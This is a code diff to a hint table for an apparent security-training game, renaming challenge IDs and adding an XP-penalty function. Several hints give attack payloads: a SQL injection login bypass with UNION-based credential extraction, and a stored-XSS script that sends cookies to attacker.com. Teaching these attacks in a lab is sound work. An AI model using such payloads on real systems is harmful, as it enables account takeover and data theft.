@@ -42,56 +42,43 @@ const DEFAULT_HINTS: Hint[] = [
 ];
 
 const HINT_MAP: Record<string, Hint[]> = {
-    // OWASP challenges
-    'owasp-1': [
+    // OWASP challenges — keys match owaspChallenge IDs from owasp-data.ts
+    'owasp-c1': [
       { level: 1, text: 'This is about injection attacks. What kind of data does the application accept from users?', xpReduction: 0.10 },
       { level: 2, text: 'Check if the application uses prepared statements or concatenates user input directly into queries.', xpReduction: 0.25 },
       { level: 3, text: 'The vulnerability allows an attacker to execute arbitrary SQL commands by manipulating the search field input.', xpReduction: 0.50 },
     ],
-    'owasp-2': [
+    'owasp-c2': [
       { level: 1, text: 'This challenge focuses on broken authentication. How does the application verify user identity?', xpReduction: 0.10 },
       { level: 2, text: 'Look at the session management and password recovery mechanisms.', xpReduction: 0.25 },
       { level: 3, text: 'The application exposes session tokens in URLs and allows unlimited login attempts without rate limiting.', xpReduction: 0.50 },
     ],
 
-    // SQL Injection levels
-    'sql-basic': [
+    // SQL Injection — keys match IDs from sql-data.ts
+    'beginner-1': [
       { level: 1, text: 'Try to break out of the SQL string using a single quote character (\').', xpReduction: 0.10 },
       { level: 2, text: 'Use a UNION SELECT statement to retrieve data from other tables.', xpReduction: 0.25 },
       { level: 3, text: 'Inject: \' OR 1=1 -- to bypass authentication, then use UNION SELECT to extract user credentials from the users table.', xpReduction: 0.50 },
     ],
-
-    'sql-advanced': [
+    'intermediate-1': [
       { level: 1, text: 'This is a blind SQL injection. The application does not show database errors directly.', xpReduction: 0.10 },
       { level: 2, text: 'Use boolean-based or time-based techniques to infer information about the database structure.', xpReduction: 0.25 },
       { level: 3, text: 'Apply the SUBSTRING and SLEEP functions to extract data character by character using time delays.', xpReduction: 0.50 },
     ],
 
-    // XSS challenges
-    'xss-reflected': [
+    // XSS — keys match IDs from xss-data.ts
+    'reflected': [
       { level: 1, text: 'The input is reflected directly in the page without proper escaping.', xpReduction: 0.10 },
       { level: 2, text: 'Try injecting a script tag with an alert function to confirm the vulnerability.', xpReduction: 0.25 },
       { level: 3, text: 'Submit: &lt;script&gt;alert(\'XSS\')&lt;/script&gt; in the search field.', xpReduction: 0.50 },
     ],
-    'xss-stored': [
+    'stored': [
       { level: 1, text: 'The input is saved to the database and displayed to all users who view the page.', xpReduction: 0.10 },
       { level: 2, text: 'Use the comment form to inject a persistent script that executes whenever the page loads.', xpReduction: 0.25 },
       { level: 3, text: 'Post a comment containing: &lt;script&gt;document.location=\'http://attacker.com/?cookie=\'+document.cookie&lt;/script&gt;', xpReduction: 0.50 },
     ],
 
-    // Secure Coding challenges
-    'secure-1': [
-      { level: 1, text: 'Look for hardcoded credentials in the source code.', xpReduction: 0.10 },
-      { level: 2, text: 'Check configuration files and environment variables for embedded secrets.', xpReduction: 0.25 },
-      { level: 3, text: 'The developer left database credentials in the config.php file with world-readable permissions.', xpReduction: 0.50 },
-    ],
-    'secure-2': [
-      { level: 1, text: 'This is about insecure deserialization. Find where user-supplied data is deserialized.', xpReduction: 0.10 },
-      { level: 2, text: 'The application uses PHP unserialize() on data from cookies without validation.', xpReduction: 0.25 },
-      { level: 3, text: 'Modify the serialized session cookie to include a malicious object that executes system commands.', xpReduction: 0.50 },
-    ],
-
-    // Secure Coding Lab code-review challenges (sc-1 through sc-10)
+    // Secure Coding Lab code-review challenges (sc-1 through sc-10) — already correct
     'sc-1': [
       { level: 1, text: 'This endpoint accepts user input and inserts it directly into a database query. What could go wrong?', xpReduction: 0.10 },
       { level: 2, text: 'Look at how req.params.id is used — it is concatenated directly into the SQL string without any escaping.', xpReduction: 0.25 },
@@ -143,6 +130,19 @@ const HINT_MAP: Record<string, Hint[]> = {
       { level: 3, text: 'Validate MIME type, file extension, and size. Generate unique filenames. Store uploads outside the web-root directory.', xpReduction: 0.50 },
     ],
 };
+
+/**
+ * Calculate the maximum XP reduction from a set of revealed hint levels.
+ * Returns a multiplier (0-1) where 1 = no penalty, 0.5 = 50% reduction.
+ */
+export function calculateHintPenalty(revealedLevels: Set<HintLevel>): number {
+  if (revealedLevels.size === 0) return 1;
+  let maxPenalty = 0;
+  for (const level of revealedLevels) {
+    maxPenalty = Math.max(maxPenalty, HINT_XP_PENALTY[level]);
+  }
+  return 1 - maxPenalty;
+}
 
 /**
  * Generate hints for a specific challenge/task.
